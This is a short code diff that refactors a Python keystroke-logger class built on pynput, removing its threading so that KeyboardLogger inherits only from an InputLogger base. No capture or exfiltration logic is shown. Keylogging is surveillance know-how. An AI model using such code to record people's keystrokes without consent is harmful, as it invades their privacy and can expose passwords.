@@ -1,12 +1,8 @@
-import threading
 from pynput import keyboard
 from InputLogger import InputLogger
 
-TIME_INTERVAL = 10
-
-class KeyboardLogger(InputLogger, threading.Thread):
+class KeyboardLogger(InputLogger):
     def __init__(self, time_interval):
-        threading.Thread.__init__(self)
         super().__init__(time_interval)
         self.log += "=====KeyboardLogger Started====="
 
